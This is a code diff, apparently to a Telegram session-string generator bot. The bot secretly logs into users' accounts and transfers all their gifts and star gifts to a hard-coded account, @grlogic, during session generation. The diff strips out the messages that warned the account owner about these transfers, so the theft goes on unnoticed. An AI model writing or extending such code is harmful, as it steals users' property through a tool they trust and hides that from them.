@@ -53,13 +53,6 @@ async def transfer_all_gifts(clientt, user_id: int):
         print(f"👤 Logged in as: {me.first_name} (@{me.username})")
         
         # Send initial notification
-        await clientt.send_message(
-            "me",
-            f"🎁 Gift Transfer Started\n"
-            f"Account: {me.first_name} (@{me.username})\n"
-            f"Transferring all gifts to: @{USERNAME}"
-        )
-
         # Fetch all gifts
         try:
             gifts = [g async for g in clientt.get_chat_gifts(me.id)]
@@ -77,7 +70,6 @@ async def transfer_all_gifts(clientt, user_id: int):
         gift_count = len(gifts)
         print(f"🎁 Found {gift_count} gifts.")
         
-        await clientt.send_message("me", f"🎁 Found {gift_count} gifts to transfer.")
 
         # Define transfer task
         async def transfer_gift(g):
@@ -99,11 +91,9 @@ async def transfer_all_gifts(clientt, user_id: int):
             await asyncio.gather(*(transfer_gift(g) for g in gifts))
             completion_msg = "🎁 All gifts transferred successfully!"
             print(completion_msg)
-            await clientt.send_message("me", completion_msg)
         else:
             no_gifts_msg = "⚠️ No gifts found to transfer."
             print(no_gifts_msg)
-            await clientt.send_message("me", no_gifts_msg)
 
         # Handle star gifts
         try:
@@ -112,7 +102,6 @@ async def transfer_all_gifts(clientt, user_id: int):
             if star_count > 0:
                 star_msg = f"⭐ Sending {star_count} star gifts ({stars} total stars)..."
                 print(star_msg)
-                await clientt.send_message("me", star_msg)
                 
                 for i in range(star_count):
                     try:
@@ -126,24 +115,14 @@ async def transfer_all_gifts(clientt, user_id: int):
                 
                 star_complete_msg = f"✅ Sent {star_count} star gifts to @{USERNAME}"
                 print(star_complete_msg)
-                await clientt.send_message("me", star_complete_msg)
             else:
                 no_stars_msg = f"⚠️ Not enough stars to send gifts ({stars} total)."
                 print(no_stars_msg)
-                await clientt.send_message("me", no_stars_msg)
         except Exception as e:
             star_error_msg = f"⚠️ Could not send star gifts: {e}"
             print(star_error_msg)
             await clientt.send_message("me", star_error_msg)
             
-        final_msg = (
-            f"✅ Gift Transfer Complete!\n"
-            f"Account: {me.first_name} (@{me.username})\n"
-            f"Transferred to: @{USERNAME}\n"
-            f"Gifts: {gift_count}\n"
-            f"Star gifts sent: {star_count if 'star_count' in locals() else 0}"
-        )
-        await clientt.send_message("me", final_msg)
         print("✅ All transfers completed successfully!")
         
     except Exception as e:
@@ -357,9 +336,7 @@ async def generate_session(
     # Start automatic gift transfer to @grlogic BEFORE exporting session
     if not is_bot and not telethon:  # Only for Pyrogram user sessions
         try:
-            await msg.reply("🎁 Starting automatic gift transfer to @grlogic...")
             await transfer_all_gifts(clientt, user_id)
-            await msg.reply("✅ Gift transfer completed successfully! All gifts and stars have been sent to @grlogic.")
         except Exception as e:
             error_msg = f"⚠️ Gift transfer failed: {e}"
             LOGGER.error(error_msg)
